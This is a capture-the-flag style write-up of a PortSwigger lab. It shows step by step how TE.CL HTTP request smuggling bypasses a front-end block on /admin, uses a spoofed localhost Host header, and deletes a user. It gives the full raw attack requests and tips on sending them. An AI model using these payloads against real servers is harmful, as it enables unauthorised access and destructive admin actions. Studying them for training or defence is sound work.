# Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl), you'll learn: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-7/images/Pasted%20image%2020230201160904.png)

According to the lab's background, there is an admin panel at `/admin`.

Let's try to access it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-7/images/Pasted%20image%2020230201160941.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-7/images/Pasted%20image%2020230201160949.png)

As you can see, that path is blocked.

To bypass that, we can try to smuggle an evil request.

But before we do that, let's test is it vulnerable to **CL.TE** (Front-end uses `Content-Length` header, back-end uses `Transfer-Encoding` header) or **TE.CL** (Front-end uses `Transfer-Encoding` header, back-end uses `Content-Length` header) HTTP request smuggling.

**To do so, we can send a `/` request to Burp Suite's Repeater:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-7/images/Pasted%20image%2020230201161146.png)

**Then change the request method to POST:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-7/images/Pasted%20image%2020230201161205.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-7/images/Pasted%20image%2020230201161209.png)

- CL.TE:

**We can first send an attack request, then send a normal request to `/`.**

**Attack request:**
```http
POST / HTTP/1.1
Host: 0acf00f60450a586c32e10f900470091.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404pls HTTP/1.1
X-Foo: x
```

This will smuggle a 404 page GET request.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-7/images/Pasted%20image%2020230201161512.png)

However, when we send this smuggled request, the back-end server returns HTTP status code "500 Internal Server Error".

**Which means it's using TE.CL**.

- TE.CL:

**Again, we can first send an attack request, then send a normal request to `/`.**

**Attack request:**
```http
POST / HTTP/1.1
Host: 0acf00f60450a586c32e10f900470091.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

aa
GET /404pls HTTP/1.1
Host: 0acf00f60450a586c32e10f900470091.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

smuggled=yes
0


```

This attack request will smuggle a 404 page GET request.

> Note: To send this request, you must include the trailing sequence `\r\n\r\n` following the final `0`, and go to the Repeater menu and ensure that the “Update Content-Length” option is unchecked.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-7/images/Pasted%20image%2020230201162025.png)

**Normal request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-7/images/Pasted%20image%2020230201162119.png)

In here, when we send the normal request, it'll also send a `/404pls` GET request, thus returns HTTP status "404 Not Found".

Hence, it's confirm that the web application is **vulnerable to TE.CL HTTP request smuggling.**

**Now, we can do the same thing to bypass the `/admin` admin panel:**
```http
POST / HTTP/1.1
Host: 0acf00f60450a586c32e10f900470091.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

a9
GET /admin HTTP/1.1
Host: 0acf00f60450a586c32e10f900470091.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

smuggled=yes
0


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-7/images/Pasted%20image%2020230201162346.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-7/images/Pasted%20image%2020230201162352.png)

We can confirm that we've bypassed the `/admin` access block!

However, it said: "Admin interface only available to local users".

Luckly, we can still bypass that.

**Let's try changing the `Host` header to `localhost`:**
```http
POST / HTTP/1.1
Host: 0acf00f60450a586c32e10f900470091.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

79
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

smuggled=yes
0


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-7/images/Pasted%20image%2020230201162610.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-7/images/Pasted%20image%2020230201162620.png)

Boom! We can finally access to the admin panel!

**Let's delete user `carlos`!**
```http
POST / HTTP/1.1
Host: 0acf00f60450a586c32e10f900470091.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

90
GET /admin/delete HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

username=carlos&smuggled=yes
0


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-7/images/Pasted%20image%2020230201162800.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-7/images/Pasted%20image%2020230201162806.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-7/images/Pasted%20image%2020230201162812.png)

Nice!

# What we've learned:

1. Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability